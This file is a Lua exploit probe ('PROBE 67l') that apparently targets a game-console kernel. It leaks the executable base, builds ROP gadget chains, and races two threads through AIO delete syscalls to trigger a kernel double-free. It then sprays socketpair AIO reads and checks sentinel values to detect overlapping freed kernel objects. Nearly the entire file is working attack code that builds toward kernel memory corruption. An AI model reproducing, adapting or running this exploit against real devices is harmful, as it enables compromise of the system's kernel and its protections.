-- CRASH_CLASS: HIGH
-- PROBE 67l: Detect kernel object overlap via socketpair AIO result buffers
--
-- After the double-free, spray blocking AIO reads on socketpairs from both
-- CPUs. If two AIO objects share kernel memory, completing one corrupts the
-- other's result/data pointer — detectable through sentinel analysis.

print("=== PROBE 67l: OVERLAP DETECT ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function fmt(val) if val==nil then return "nil" end local h,l=get_hi_lo(val) return string.format("0x%08X%08X",h,l) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(p+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(p+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib)+0x108) or 0; local ehi = rd(N(ib)+0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(uint64(N(sa)+16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_aio(fd, dbuf, rbuf)
    wq(N(reqs), uint64(1)); wq(N(reqs)+8, uint64(16))
    local bh,bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
    local rh,rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
    wd(N(reqs)+0x20, fd); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
    pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
    return rd(N(one_id)) or 0
end
local function submit_zero()
    return submit_aio(fd_zero, data_buf, result_buf)
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

local pin_buf = memory.alloc(8)
local function set_cpu(mask)
    wq(N(pin_buf), uint64(mask))
    pcall(function() mk(488)(uint64(3),uint64(2),uint64(pid_val),uint64(8),uint64(N(pin_buf))) end)
end

-- Gate socketpairs
print("")
print("-- GATE SETUP --")
local sp_A = memory.alloc(16); wd(N(sp_A), 0xFFFFFFFF); wd(N(sp_A)+4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_A))) end)
local gra = rd(N(sp_A)) or -1; local gwa = rd(N(sp_A)+4) or -1

local sp_B = memory.alloc(16); wd(N(sp_B), 0xFFFFFFFF); wd(N(sp_B)+4, 0xFFFFFFFF)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_B))) end)
local grb = rd(N(sp_B)) or -1; local gwb = rd(N(sp_B)+4) or -1
print(string.format("gateA: rd=%d wr=%d  gateB: rd=%d wr=%d", gra, gwa, grb, gwb))
if gra < 0 or gwa < 0 or grb < 0 or gwb < 0 then print("GATE FAIL"); return end

-- Shared race state
local del_ids = memory.alloc(4*BATCH+0x10)
local states_A = memory.alloc(4*BATCH+0x10)
local states_B = memory.alloc(4*BATCH+0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8)
local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

-- =============================================
-- [A] GATED RACE — 5 iters
-- =============================================
local ITERS = 5
local total_doubles = 0

print("")
print("-- [A] RACE: " .. ITERS .. " iters --")

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_zero()
        if id ~= 0 then poll_one(id); ids[#ids+1] = id end
    end
    if #ids < BATCH then print("SHORT at iter " .. iter); break end

    for i = 0, BATCH-1 do
        wd(N(del_ids)+i*4, ids[i+1])
        wd(N(states_A)+i*4, 0xAA)
        wd(N(states_B)+i*4, 0xBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    local sb_a = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb_a+i, 0) end
    local sp_a = sb_a + 0x2000 - ((sb_a+0x2000)%16) - 8
    local oa = 0
    local function wa(v) wq(sp_a+oa, v); oa = oa+8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    local sb_b = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb_b+i, 0) end
    local sp_b = sb_b + 0x2000 - ((sb_b+0x2000)%16) - 8
    local ob = 0
    local function wb(v) wq(sp_b+ob, v); ob = ob+8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa)+0x10, uint64(sb_a))
    wq(N(pa)+0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb)+i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb)+0x10, uint64(sb_b))
    wq(N(pb)+0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    local a_ok2, b_ok2 = false, false
    for w = 1, 500000 do
        if not a_ok2 and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_ok2 = true end
        if not b_ok2 and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_ok2 = true end
        if a_ok2 and b_ok2 then break end
    end

    if not (a_ok2 and b_ok2) then
        print(string.format("  iter %d: MARKER TIMEOUT a=%s b=%s", iter, tostring(a_ok2), tostring(b_ok2)))
        break
    end

    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)

    for w = 1, 100000 do end

    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, BATCH-1 do
        local sA = rd(N(states_A)+i*4) or 0xAA
        local sB = rd(N(states_B)+i*4) or 0xBB
        if sA == 0 then a_ok = a_ok+1 end
        if sB == 0 then b_ok = b_ok+1 end
        if sA == 0 and sB == 0 then doubles = doubles+1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLES *** A=%d B=%d", iter, doubles, a_ok, b_ok))
    else
        print(string.format("  iter %d: A=%d B=%d", iter, a_ok, b_ok))
    end
end

print("total_doubles=" .. total_doubles)

if total_doubles < 1 or not alive() then
    print("SKIP overlap test")
    print("=== 67l DONE ===")
    return
end

-- =============================================
-- [B] SOCKETPAIR AIO SPRAY — detect overlap via result buffers
-- =============================================
print("")
print("-- [B] SOCKETPAIR AIO SPRAY --")

local NSP = 24

-- Create socketpairs for set A
local sp_fds_A = {}
for i = 1, NSP do
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp)+4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp)+4) or -1
    if r > 0 and w > 0 then sp_fds_A[#sp_fds_A+1] = {r=r, w=w} end
end

-- Create socketpairs for set B
local sp_fds_B = {}
for i = 1, NSP do
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp)+4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp)+4) or -1
    if r > 0 and w > 0 then sp_fds_B[#sp_fds_B+1] = {r=r, w=w} end
end

print(string.format("  socketpairs: A=%d B=%d", #sp_fds_A, #sp_fds_B))

if #sp_fds_A < NSP or #sp_fds_B < NSP then
    print("  socketpair alloc failed")
    print("=== 67l DONE ===")
    return
end

-- Allocate per-request result + data buffers with unique sentinels
local res_A = {}
local dat_A = {}
local ids_A = {}
local res_B = {}
local dat_B = {}
local ids_B = {}

for i = 1, NSP do
    res_A[i] = memory.alloc(8); wd(N(res_A[i]), 0xAAAAAAAA)
    dat_A[i] = memory.alloc(32)
    for j = 0, 28, 4 do wd(N(dat_A[i])+j, 0xDEAD0000 + i) end
end
for i = 1, NSP do
    res_B[i] = memory.alloc(8); wd(N(res_B[i]), 0xBBBBBBBB)
    dat_B[i] = memory.alloc(32)
    for j = 0, 28, 4 do wd(N(dat_B[i])+j, 0xBEEF0000 + i) end
end

-- CPU 0: submit AIO reads on set A socketpairs (blocking — no data yet)
set_cpu(1)
for i = 1, NSP do
    local id = submit_aio(sp_fds_A[i].r, dat_A[i], res_A[i])
    ids_A[i] = id
end

-- CPU 1: submit AIO reads on set B socketpairs (blocking — no data yet)
set_cpu(2)
for i = 1, NSP do
    local id = submit_aio(sp_fds_B[i].r, dat_B[i], res_B[i])
    ids_B[i] = id
end

set_cpu(0x7F)
print(string.format("  submitted: A=%d B=%d", #ids_A, #ids_B))

-- Check: before triggering any reads, ALL results should be sentinels
local pre_a_changed, pre_b_changed = 0, 0
for i = 1, NSP do
    local v = rd(N(res_A[i])) or 0xAAAAAAAA
    if v ~= 0xAAAAAAAA then pre_a_changed = pre_a_changed + 1 end
end
for i = 1, NSP do
    local v = rd(N(res_B[i])) or 0xBBBBBBBB
    if v ~= 0xBBBBBBBB then pre_b_changed = pre_b_changed + 1 end
end
print(string.format("  pre-trigger: A_changed=%d B_changed=%d", pre_a_changed, pre_b_changed))

-- =============================================
-- [C] TRIGGER SET A — write to A's socketpairs
-- =============================================
print("")
print("-- [C] TRIGGER A --")
local trigger_buf = memory.alloc(16)
for j = 0, 12, 4 do wd(N(trigger_buf)+j, 0x41424344) end

for i = 1, NSP do
    pcall(function() mk(4)(uint64(sp_fds_A[i].w), uint64(N(trigger_buf)), uint64(8)) end)
end

-- Wait for AIO completions
for w = 1, 200000 do end

-- Check results
local a_completed, a_sentinel, a_other = 0, 0, 0
local b_completed, b_sentinel, b_other = 0, 0, 0
local a_details = {}
local b_details = {}

for i = 1, NSP do
    local v = rd(N(res_A[i])) or 0xDEADDEAD
    if v == 0xAAAAAAAA then
        a_sentinel = a_sentinel + 1
        if #a_details < 5 then a_details[#a_details+1] = string.format("A[%d]: SENTINEL (result never written!)", i) end
    elseif v > 0 and v <= 16 then
        a_completed = a_completed + 1
    else
        a_other = a_other + 1
        if #a_details < 5 then a_details[#a_details+1] = string.format("A[%d]: 0x%08X", i, v) end
    end
end

for i = 1, NSP do
    local v = rd(N(res_B[i])) or 0xDEADDEAD
    if v == 0xBBBBBBBB then
        b_sentinel = b_sentinel + 1
    elseif v > 0 and v <= 16 then
        b_completed = b_completed + 1
        if #b_details < 5 then b_details[#b_details+1] = string.format("B[%d]: %d (COMPLETED without trigger!)", i, v) end
    else
        b_other = b_other + 1
        if #b_details < 5 then b_details[#b_details+1] = string.format("B[%d]: 0x%08X", i, v) end
    end
end

print(string.format("  A: completed=%d sentinel=%d other=%d", a_completed, a_sentinel, a_other))
print(string.format("  B: completed=%d sentinel=%d other=%d", b_completed, b_sentinel, b_other))
for _, s in ipairs(a_details) do print("    " .. s) end
for _, s in ipairs(b_details) do print("    " .. s) end

if a_sentinel > 0 then print("  *** A SENTINEL = OVERLAP: result written to wrong buffer! ***") end
if b_completed > 0 then print("  *** B COMPLETED = OVERLAP: A's result landed in B's buffer! ***") end

-- =============================================
-- [D] ALSO CHECK: data buffer corruption
-- =============================================
print("")
print("-- [D] DATA BUFFER CHECK --")
local a_dat_ok, a_dat_real, a_dat_wrong = 0, 0, 0
local b_dat_ok, b_dat_wrong = 0, 0

for i = 1, NSP do
    local v = rd(N(dat_A[i])) or 0
    if v == 0xDEAD0000 + i then
        a_dat_ok = a_dat_ok + 1
    elseif v == 0x41424344 then
        a_dat_real = a_dat_real + 1
    else
        a_dat_wrong = a_dat_wrong + 1
        if a_dat_wrong <= 3 then print(string.format("    A[%d] data: 0x%08X", i, v)) end
    end
end

for i = 1, NSP do
    local v = rd(N(dat_B[i])) or 0
    if v == 0xBEEF0000 + i then
        b_dat_ok = b_dat_ok + 1
    elseif v == 0x41424344 then
        b_dat_wrong = b_dat_wrong + 1
        if b_dat_wrong <= 3 then print(string.format("    B[%d] data: 0x%08X (GOT A's trigger data!)", i, v)) end
    else
        b_dat_wrong = b_dat_wrong + 1
        if b_dat_wrong <= 3 then print(string.format("    B[%d] data: 0x%08X", i, v)) end
    end
end

print(string.format("  A: sentinel=%d real_data=%d wrong=%d", a_dat_ok, a_dat_real, a_dat_wrong))
print(string.format("  B: sentinel=%d wrong=%d", b_dat_ok, b_dat_wrong))
if b_dat_wrong > 0 then print("  *** B DATA CORRUPTED = OVERLAP CONFIRMED ***") end

-- =============================================
-- [E] DELETE + 663 CHECK
-- =============================================
if alive() then
    print("")
    print("-- [E] DELETE + 663 --")

    -- Delete set A
    local da_ok, da_fail = 0, 0
    for i = 1, NSP do
        local st = delete_one(ids_A[i])
        if st == 0 then da_ok = da_ok+1 else da_fail = da_fail+1 end
    end
    print(string.format("  del A: ok=%d fail=%d", da_ok, da_fail))

    -- 663 on set B (after A deleted — check for status anomaly)
    local b_663_ok, b_663_fail, b_663_anom = 0, 0, 0
    local b_663_details = {}
    for i = 1, NSP do
        wd(N(one_id), ids_B[i])
        wd(N(one_st), 0xDEAD)
        local ret = sgn(mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))))
        local st = rd(N(one_st)) or 0xDEAD
        if ret == 0 and (st == 3 or st == 0x10003) then
            b_663_ok = b_663_ok + 1
        elseif ret == -1 then
            b_663_fail = b_663_fail + 1
        else
            b_663_anom = b_663_anom + 1
            if #b_663_details < 5 then
                b_663_details[#b_663_details+1] = string.format("B[%d] id=0x%X: ret=%d st=0x%X", i, ids_B[i], ret, st)
            end
        end
    end
    print(string.format("  663 B: ok=%d fail=%d anom=%d", b_663_ok, b_663_fail, b_663_anom))
    for _, s in ipairs(b_663_details) do print("    " .. s) end
    if b_663_fail > 0 then print("  *** 663 FAIL on B after A deleted = overlap freed the shared object ***") end

    -- Delete set B
    local db_ok, db_fail = 0, 0
    for i = 1, NSP do
        if not alive() then db_fail = db_fail + (NSP - i + 1); break end
        local st = delete_one(ids_B[i])
        if st == 0 then db_ok = db_ok+1 else db_fail = db_fail+1 end
    end
    print(string.format("  del B: ok=%d fail=%d", db_ok, db_fail))
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67l DONE ===")
